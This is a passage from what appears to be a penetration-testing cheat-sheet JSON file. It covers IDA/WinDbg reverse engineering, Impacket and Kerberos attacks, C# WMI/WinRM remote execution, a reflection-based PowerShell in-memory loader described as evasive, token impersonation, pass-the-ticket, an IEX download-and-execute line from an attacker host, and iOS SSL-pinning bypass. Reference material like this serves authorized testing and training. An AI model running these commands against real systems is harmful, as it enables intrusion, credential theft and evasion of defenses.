            "content": "Work with function definitions."
          }
        ]
      },
      {
        "title": "Search Functions",
        "codes": [
          {
            "lang": "text",
            "code": "Alt+T       ; Text search in disassembly\nAlt+B       ; Binary/byte sequence search\nCtrl+F      ; Search in current view\nAlt+I       ; Search for immediate value"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Find specific content in the binary."
          }
        ]
      },
      {
        "title": "Search for String",
        "codes": [
          {
            "lang": "text",
            "code": "View -> Open Subviews -> Strings (Shift+F12)\nDouble-click string to navigate to it\nUse Ctrl+F to filter string list"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Locate strings in the binary."
          }
        ]
      },
      {
        "title": "Search for Imports",
        "codes": [
          {
            "lang": "text",
            "code": "View -> Open Subviews -> Imports\nLocate function (e.g., recv, strcpy)\nDouble-click to navigate\nX to find cross-references"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Find imported functions."
          }
        ]
      },
      {
        "title": "Synchronize with WinDbg",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Link **IDA** static analysis with **WinDbg** dynamic debugging:\n1. In WinDbg: `lm m <module>` to get base address\n2. In IDA: Edit -> Segments -> Rebase program\n3. Enter the runtime base address from WinDbg\n4. Addresses now match between IDA and WinDbg",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Calculate Rebased Address",
        "codes": [
          {
            "lang": "text",
            "code": "Runtime Address = IDA Address - IDA Base + WinDbg Base\nIDA Address = Runtime Address - WinDbg Base + IDA Base"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Convert between IDA and WinDbg addresses."
          }
        ]
      },
      {
        "title": "Common Windows API to Find",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Functions often involved in vulnerabilities:\n- **strcpy, strcat, sprintf**: Buffer overflow candidates\n- **memcpy, memmove**: Size-related overflows\n- **recv, read**: Network input handling\n- **fgets, gets**: File/stdin input\n- **CreateFileA, ReadFile**: File operations",
            "variant": "important"
          }
        ]
      },
      {
        "title": "Graph Overview",
        "codes": [
          {
            "lang": "text",
            "code": "Space           ; Toggle graph/text view\n+/-             ; Zoom in/out in graph\nCtrl+Mouse      ; Pan around graph\nOverview Window ; Minimap of current function"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Use the graph view for function structure."
          }
        ]
      },
      {
        "title": "Exports Window",
        "codes": [
          {
            "lang": "text",
            "code": "View -> Open Subviews -> Exports\nUseful for finding entry points and exported APIs"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "View exported functions from a DLL."
          }
        ]
      },
      {
        "title": "Apply Structure Types",
        "codes": [
          {
            "lang": "text",
            "code": "T           ; Set type for variable\nY           ; Change function prototype\nInsert      ; Add structure member (in Structures view)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Define structures for better analysis."
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "IDA Pro Documentation",
        "url": "https://hex-rays.com/documentation/"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "**IDA Pro** is the industry-standard disassembler for static analysis and reverse engineering."
      }
    ]
  },
  {
    "category": "Linked SQL Server Attacks",
    "title": "Impacket Link Commands [Local]",
    "tags": [
      "Exploitation",
      "SQL",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "text",
        "content": "```bash\nimpacket-mssqlclient <User>:<Pass>@<Target> -windows-auth"
      },
      {
        "type": "text",
        "content": "SQL> enum_links\nSQL> use_link <LinkedServer>\nSQL> xp_cmdshell whoami\n```"
      }
    ]
  },
  {
    "category": "Active Directory and Kerberos Attacks",
    "title": "Impacket Tools Reference",
    "tags": [
      "Active_Directory",
      "Kerberos",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "**GetNPUsers** AS-REP Roasting | **GetUserSPNs** Kerberoasting\n**secretsdump** Credential dumping | **psexec/wmiexec/smbexec** Remote execution\n**getTGT** Get TGT with hash | **getST** Get service ticket for impersonation\n**ticketer** Create golden/silver tickets | **addcomputer** Add computer account\n**rbcd** RBCD attack | **lookupsid** SID enumeration\n**GetADUsers** Enumerate domain users via LDAP"
      }
    ]
  },
  {
    "category": "Fileless Lateral Movement",
    "title": "Implementing Fileless Movement in C#",
    "tags": [
      "Lateral_Movement",
      "Windows"
    ],
    "steps": [
      {
        "title": "WMI Process Creation",
        "codes": [
          {
            "lang": "csharp",
            "code": "using System;\nusing System.Management;\n\nclass WMIExec\n{\n    static void Main(string[] args)\n    {\n        string target = args[0];\n        string command = args[1];\n        string username = args[2];\n        string password = args[3];\n\n        ConnectionOptions options = new ConnectionOptions();\n        options.Username = username;\n        options.Password = password;\n\n        ManagementScope scope = new ManagementScope(\"\\\\\\\\\" + target + \"\\\\root\\\\cimv2\", options);\n        scope.Connect();\n\n        ManagementClass processClass = new ManagementClass(scope, new ManagementPath(\"Win32_Process\"), null);\n        ManagementBaseObject inParams = processClass.GetMethodParameters(\"Create\");\n        inParams[\"CommandLine\"] = command;\n\n        ManagementBaseObject outParams = processClass.InvokeMethod(\"Create\", inParams, null);\n        Console.WriteLine(\"ReturnValue: \" + outParams[\"ReturnValue\"]);\n        Console.WriteLine(\"ProcessId: \" + outParams[\"ProcessId\"]);\n    }\n}"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "WinRM Execution with C#",
        "codes": [
          {
            "lang": "csharp",
            "code": "using System;\nusing System.Management.Automation;\nusing System.Management.Automation.Runspaces;\nusing System.Security;\n\nclass WinRMExec\n{\n    static void Main(string[] args)\n    {\n        string target = args[0];\n        string username = args[1];\n        string password = args[2];\n        string command = args[3];\n\n        SecureString secPass = new SecureString();\n        foreach (char c in password) secPass.AppendChar(c);\n        PSCredential cred = new PSCredential(username, secPass);\n\n        WSManConnectionInfo connInfo = new WSManConnectionInfo(\n            new Uri(\"http://\" + target + \":5985/wsman\"),\n            \"http://schemas.microsoft.com/powershell/Microsoft.PowerShell\",\n            cred\n        );\n\n        using (Runspace rs = RunspaceFactory.CreateRunspace(connInfo))\n        {\n            rs.Open();\n            using (PowerShell ps = PowerShell.Create())\n            {\n                ps.Runspace = rs;\n                ps.AddScript(command);\n                var results = ps.Invoke();\n                foreach (var result in results)\n                {\n                    Console.WriteLine(result);\n                }\n            }\n        }\n    }\n}"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Security Headers Scanning",
    "title": "Important Security Headers",
    "tags": [
      "Reconnaissance",
      "Security_Headers",
      "Web_Application"
    ],
    "steps": [
      {
        "title": "Content-Security-Policy (CSP)",
        "codes": [
          {
            "lang": "text",
            "code": "Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com"
          },
          {
            "lang": "text",
            "code": "Content-Security-Policy: default-src *; script-src 'unsafe-inline' 'unsafe-eval'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Prevents XSS attacks by controlling which resources can be loaded.",
            "variant": "info"
          },
          {
            "type": "text",
            "content": "**Good CSP:**"
          }
        ],
        "postNotes": [
          {
            "type": "note",
            "content": "`unsafe-inline` and `unsafe-eval` allow XSS attacks.",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "X-Frame-Options",
        "codes": [
          {
            "lang": "text",
            "code": "# No header = vulnerable to clickjacking"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Prevents clickjacking attacks by controlling iframe embedding.",
            "variant": "info"
          },
          {
            "type": "text",
            "content": "**Values:**\n- `DENY` - Cannot be framed (most secure)\n- `SAMEORIGIN` - Can only be framed by same origin\n- `ALLOW-FROM https://example.com` - Can be framed by specific origin"
          },
          {
            "type": "text",
            "content": "**Missing X-Frame-Options:**"
          }
        ]
      },
      {
        "title": "Strict-Transport-Security (HSTS)",
        "codes": [
          {
            "lang": "text",
            "code": "Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"
          },
          {
            "lang": "text",
            "code": "Strict-Transport-Security: max-age=300"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Forces browsers to use HTTPS only.",
            "variant": "info"
          },
          {
            "type": "text",
            "content": "**Good HSTS:**"
          }
        ],
        "postNotes": [
          {
            "type": "note",
            "content": "Short max-age values provide minimal protection.",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "X-Content-Type-Options",
        "codes": [
          {
            "lang": "text",
            "code": "X-Content-Type-Options: nosniff"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Prevents MIME-sniffing attacks.",
            "variant": "info"
          },
          {
            "type": "text",
            "content": "**Correct Value:**"
          }
        ],
        "postNotes": [
          {
            "type": "note",
            "content": "Missing this header allows browsers to interpret files as different MIME types.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "X-XSS-Protection",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Enables browser's built-in XSS filter (legacy, replaced by CSP).",
            "variant": "info"
          },
          {
            "type": "text",
            "content": "**Values:**\n- `0` - Disables XSS filter (bad)\n- `1` - Enables XSS filter\n- `1; mode=block` - Blocks page if XSS detected (best)"
          }
        ]
      },
      {
        "title": "Referrer-Policy",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Controls how much referrer information is sent with requests.",
            "variant": "info"
          },
          {
            "type": "text",
            "content": "**Secure Values:**\n- `no-referrer` - Never send referrer\n- `strict-origin-when-cross-origin` - Send origin only for cross-origin requests"
          },
          {
            "type": "text",
            "content": "**Insecure:**\n- `unsafe-url` - Always send full URL (leaks sensitive data)"
          }
        ]
      },
      {
        "title": "Permissions-Policy (formerly Feature-Policy)",
        "codes": [
          {
            "lang": "text",
            "code": "Permissions-Policy: geolocation=(), microphone=(), camera=()"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Controls which browser features can be used.",
            "variant": "info"
          },
          {
            "type": "text",
            "content": "**Example:**"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "PowerShell Shellcode Runner",
    "title": "In-Memory Execution (No Disk)",
    "tags": [
      "Binary_Exploitation",
      "Code_Injection",
      "Defense_Evasion",
      "Execution",
      "PowerShell",
      "Windows"
    ],
    "steps": [
      {
        "title": "UnsafeNativeMethods Approach",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Get reference to Microsoft.Win32.UnsafeNativeMethods\n$systemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\\\')[-1] -eq 'System.dll' }\n$unsafeNativeMethods = $systemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')\n\n# Get GetProcAddress method\n$getProcAddress = $unsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))\n\n# Get GetModuleHandle method\n$getModuleHandle = $unsafeNativeMethods.GetMethod('GetModuleHandle')"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Leverage existing .NET assemblies that already have P/Invoke signatures.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Get Function Address Helper",
        "codes": [
          {
            "lang": "powershell",
            "code": "function Get-ProcAddress {\n    Param(\n        [Parameter(Mandatory=$true)][String]$Module,\n        [Parameter(Mandatory=$true)][String]$Function\n    )\n\n    $systemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\\\')[-1] -eq 'System.dll' }\n    $unsafeNativeMethods = $systemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')\n    $getModuleHandle = $unsafeNativeMethods.GetMethod('GetModuleHandle')\n    $getProcAddress = $unsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))\n\n    $moduleHandle = $getModuleHandle.Invoke($null, @($Module))\n    $handleRef = New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), $moduleHandle)\n\n    return $getProcAddress.Invoke($null, @($handleRef, $Function))\n}"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Delegate Type Creation",
        "codes": [
          {
            "lang": "powershell",
            "code": "function Get-DelegateType {\n    Param(\n        [Parameter(Mandatory=$true)][Type[]]$Parameters,\n        [Parameter(Mandatory=$true)][Type]$ReturnType\n    )\n\n    $domain = [AppDomain]::CurrentDomain\n    $dynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')\n    $assemblyBuilder = $domain.DefineDynamicAssembly($dynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)\n    $moduleBuilder = $assemblyBuilder.DefineDynamicModule('InMemoryModule', $false)\n    $typeBuilder = $moduleBuilder.DefineType('DelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])\n\n    $constructorBuilder = $typeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)\n    $constructorBuilder.SetImplementationFlags('Runtime, Managed')\n\n    $methodBuilder = $typeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)\n    $methodBuilder.SetImplementationFlags('Runtime, Managed')\n\n    return $typeBuilder.CreateType()\n}"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Use reflection to avoid disk writes. More evasive than **Add-Type**.",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Access Token Attacks",
    "title": "Incognito",
    "tags": [
      "Credential_Access",
      "Privilege_Escalation",
      "Token_Manipulation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Meterpreter Incognito",
        "codes": [
          {
            "lang": "text",
            "code": "meterpreter> load incognito\nmeterpreter> list_tokens -u\nmeterpreter> impersonate_token \"DOMAIN\\\\Administrator\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Incognito Standalone",
        "codes": [
          {
            "lang": "bash",
            "code": "incognito.exe list_tokens -u\nincognito.exe execute -c \"DOMAIN\\Administrator\" cmd.exe"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Linux Privilege Escalation",
    "title": "Initial Enumeration",
    "tags": [
      "Linux",
      "Post_Exploitation",
      "Privilege_Escalation"
    ],
    "steps": [
      {
        "title": "Services Running as Root",
        "codes": [
          {
            "lang": "bash",
            "code": "ps aux | grep root"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Check for services running as root that may have shell escape sequences."
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "text",
        "content": "```bash\nid\nwhoami\nuname -a\ncat /etc/os-release\nsudo -l\n```"
      }
    ]
  },
  {
    "category": "Pass-the-Ticket",
    "title": "Inject Ticket with Mimikatz [Remote]",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Impacket",
      "Kerberos",
      "Lateral_Movement",
      "Mimikatz",
      "Pass-the-Ticket",
      "Rubeus",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "text",
        "content": "```powershell\n.\\mimikatz.exe \"kerberos::ptt <ticket.kirbi>\" \"exit\"\n```"
      }
    ]
  },
  {
    "category": "Pass-the-Ticket",
    "title": "Inject Ticket with Rubeus [alternative]",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Impacket",
      "Kerberos",
      "Lateral_Movement",
      "Mimikatz",
      "Pass-the-Ticket",
      "Rubeus",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "text",
        "content": "```powershell\n.\\Rubeus.exe ptt /ticket:<base64_ticket>\n```"
      },
      {
        "type": "text",
        "content": "```powershell\n.\\Rubeus.exe ptt /ticket:<ticket.kirbi>\n```"
      }
    ]
  },
  {
    "category": "Input Tracing",
    "title": "Input Tracing",
    "tags": [
      "Binary_Exploitation",
      "Debugging",
      "Exploitation",
      "Reverse_Engineering",
      "Windows"
    ],
    "steps": [
      {
        "title": "Hook recv Function",
        "codes": [
          {
            "lang": "text",
            "code": "0:000> bp ws2_32!recv \"dd esp L5; db poi(esp+8) L poi(esp+0xc); g\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Set breakpoint on network receive to capture input."
          }
        ],
        "postNotes": [
          {
            "type": "note",
            "content": "Parameters: recv(socket, buffer, len, flags)\nESP+4=socket, ESP+8=buffer, ESP+C=len, ESP+10=flags"
          }
        ]
      },
      {
        "title": "Hook recv with Logging",
        "codes": [
          {
            "lang": "text",
            "code": "0:000> bp ws2_32!recv \".printf \\\"recv(%d, 0x%p, %d)\\\\n\\\", poi(esp+4), poi(esp+8), poi(esp+c); g\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Log received data without stopping."
          }
        ]
      },
      {
        "title": "Break on recv Return",
        "codes": [
          {
            "lang": "text",
            "code": "0:000> bp ws2_32!recv \"gu; .if (@eax > 0) { .printf \\\"Received %d bytes:\\\\n\\\", @eax; db poi(esp+8) L@eax } .else { .printf \\\"recv failed\\\\n\\\" }; g\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Capture actual bytes received."
          }
        ]
      },
      {
        "title": "Hook ReadFile",
        "codes": [
          {
            "lang": "text",
            "code": "0:000> bp kernel32!ReadFile \"dd esp L6; g\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Trace file input."
          }
        ],
        "postNotes": [
          {
            "type": "note",
            "content": "Parameters: ReadFile(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped)"
          }
        ]
      },
      {
        "title": "Set Data Breakpoint",
        "codes": [
          {
            "lang": "text",
            "code": "0:000> ba w 4 <BufferAddress>       ; Break on write\n0:000> ba r 4 <BufferAddress>       ; Break on read"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Break when specific memory is accessed."
          }
        ]
      },
      {
        "title": "Trace memcpy Calls",
        "codes": [
          {
            "lang": "text",
            "code": "0:000> bp msvcrt!memcpy \".printf \\\"memcpy(0x%p, 0x%p, 0x%x)\\\\n\\\", poi(esp+4), poi(esp+8), poi(esp+c); g\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Monitor buffer copies for overflow potential."
          }
        ]
      },
      {
        "title": "Trace strcpy Calls",
        "codes": [
          {
            "lang": "text",
            "code": "0:000> bp msvcrt!strcpy \".printf \\\"strcpy(0x%p, 0x%p) src=\\\\\\\"\\\", poi(esp+4), poi(esp+8); da poi(esp+8); g\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Monitor unsafe string copies."
          }
        ]
      },
      {
        "title": "Conditional Break on Buffer Size",
        "codes": [
          {
            "lang": "text",
            "code": "0:000> bp msvcrt!memcpy \".if (poi(esp+c) > 0x100) { .printf \\\"Large memcpy: %x bytes\\\\n\\\", poi(esp+c) } .else { g }\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Break only when copy size exceeds threshold."
          }
        ]
      },
      {
        "title": "Trace Execution Path",
        "codes": [
          {
            "lang": "text",
            "code": "0:000> wt -l 3              ; Trace with depth limit\n0:000> pc                   ; Step to next call\n0:000> pt                   ; Step to next return"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Record functions called after receiving input."
          }
        ]
      },
      {
        "title": "IDA Synchronization for Tracing",
        "codes": [
          {
            "lang": "text",
            "code": "1. In WinDbg: lm m <module> (get base address)\n2. In IDA: Edit -> Segments -> Rebase\n3. Note function at current EIP in WinDbg\n4. Navigate to same address in IDA\n5. Analyze code flow statically"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Sync WinDbg address with IDA for analysis."
          }
        ]
      },
      {
        "title": "Mark Input Buffer in Memory",
        "codes": [
          {
            "lang": "python",
            "code": "# Send identifiable pattern\npattern = b\"A\" * 100 + b\"BBBB\" + b\"C\" * 100"
          },
          {
            "lang": "text",
            "code": "; In WinDbg, search for pattern\n0:000> s -a 0 L?7fffffff \"AAAA\"\n0:000> s -a 0 L?7fffffff \"BBBB\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Use pattern to identify where input lands."
          }
        ]
      },
      {
        "title": "Trace Data Transformation",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Follow input through parsing/transformation:\n1. Set breakpoint after recv\n2. Note buffer address and content\n3. Set hardware breakpoint on buffer\n4. Continue; break when data is read\n5. Analyze transformation at each step",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "WinDbg Conditional Breakpoints",
        "url": "https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/setting-a-conditional-breakpoint"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Trace user-controlled input through application to find vulnerabilities."
      }
    ]
  },
  {
    "category": "Tunneling with Chisel",
    "title": "Installation",
    "tags": [
      "Lateral_Movement",
      "Linux",
      "Pivoting",
      "Tunneling",
      "Windows"
    ],
    "steps": [
      {
        "title": "Download Chisel",
        "codes": [
          {
            "lang": "bash",
            "code": "# On Kali\nwget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz\ngunzip chisel_1.9.1_linux_amd64.gz\nchmod +x chisel_1.9.1_linux_amd64\nmv chisel_1.9.1_linux_amd64 /usr/local/bin/chisel"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Download for Windows",
        "codes": [
          {
            "lang": "bash",
            "code": "# Download Windows binary\nwget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz\ngunzip chisel_1.9.1_windows_amd64.gz\nmv chisel_1.9.1_windows_amd64 chisel.exe"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Invoke-RunasCs",
    "title": "Installation",
    "tags": [
      "Lateral_Movement",
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Download and Import",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Download from GitHub\nIEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/antonioCoco/RunasCs/master/Invoke-RunasCs.ps1')\n\n# Or download to disk\nwget https://raw.githubusercontent.com/antonioCoco/RunasCs/master/Invoke-RunasCs.ps1 -O Invoke-RunasCs.ps1\nImport-Module .\\Invoke-RunasCs.ps1"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Load from Kali",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Start HTTP server on Kali\npython3 -m http.server 80\n\n# Load on Windows\nIEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-RunasCs.ps1')"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "NetExec",
    "title": "Installation",
    "tags": [
      "Active_Directory",
      "Discovery",
      "Enumeration",
      "NetExec",
      "Windows"
    ],
    "steps": [
      {
        "title": "Install via pipx (Recommended)",
        "codes": [
          {
            "lang": "bash",
            "code": "pipx install git+https://github.com/Pennyw0rth/NetExec"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Install via pip",
        "codes": [
          {
            "lang": "bash",
            "code": "pip install netexec"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Verify Installation",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc --version"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Security Headers Scanning",
    "title": "Integration with Other Tools",
    "tags": [
      "Reconnaissance",
      "Security_Headers",
      "Web_Application"
    ],
    "steps": [
      {
        "title": "Combine with Nmap",
        "codes": [
          {
            "lang": "bash",
            "code": "nmap -p 80,443 --script http-security-headers,http-server-header <TargetIP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Combine with Nikto",
        "codes": [
          {
            "lang": "bash",
            "code": "nikto -h https://example.com -Tuning 6  # Focus on headers"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Combine with WhatWeb",
        "codes": [
          {
            "lang": "bash",
            "code": "whatweb -v https://example.com"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "WhatWeb identifies technologies and checks headers simultaneously.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Invoke-RunasCs",
    "title": "Invoke-RunasCs",
    "tags": [
      "Lateral_Movement",
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [],
    "resources": [
      {
        "text": "RunasCs GitHub",
        "url": "https://github.com/antonioCoco/RunasCs"
      },
      {
        "text": "Invoke-RunasCs.ps1",
        "url": "https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Windows equivalent of Linux `su` command - execute commands as another user with known credentials."
      }
    ]
  },
  {
    "category": "iOS Pentesting",
    "title": "iOS Dynamic Analysis",
    "tags": [
      "Exploitation",
      "Mobile"
    ],
    "steps": [
      {
        "title": "Install Frida on Device",
        "codes": [
          {
            "lang": "bash",
            "code": "# Add Frida repo to Cydia/Sileo: https://build.frida.re\n# Or install via apt\napt install frida\n\nfrida-ps -U  # Verify"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Proxy Traffic with Burp",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Configure Burp proxy on iOS:\n1. Install Burp CA on device\n2. Settings > General > About > Certificate Trust Settings\n3. Enable full trust for Burp certificate\n4. Settings > WiFi > Configure Proxy > Manual\n5. Server: AttackerIP, Port: 8080",
            "variant": "info"
          }
        ]
      },
      {
        "title": "SSL Pinning Bypass",
        "codes": [
          {
            "lang": "bash",
            "code": "objection -g <BundleID> explore\n> ios sslpinning disable"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Check Keychain",
        "codes": [
          {
            "lang": "bash",
            "code": "objection -g <BundleID> explore\n> ios keychain dump\n\n# Or use keychain-dumper on device\n./keychain-dumper"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Check Data Storage",
        "codes": [
          {
            "lang": "bash",
            "code": "# App data location\n/var/mobile/Containers/Data/Application/<UUID>/\n\n# Preferences\nplutil -p Library/Preferences/<BundleID>.plist\n\n# Databases\nsqlite3 <database.db>\n> .tables\n> SELECT * FROM <Table>;"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Test URL Schemes",
        "codes": [
          {
            "lang": "bash",
            "code": "# Check Info.plist for CFBundleURLTypes\nplutil -p Info.plist | grep -A10 CFBundleURLTypes\n\n# Open URL on device\nuiopen \"<scheme>://<path>\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Objection Commands",
        "codes": [
          {
            "lang": "bash",
            "code": "objection -g <BundleID> explore\n> env\n> ios hooking list classes\n> ios hooking watch method \"<ClassName> <MethodName>\"\n> ios jailbreak disable"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "MobSF (Automated)",
        "codes": [
          {
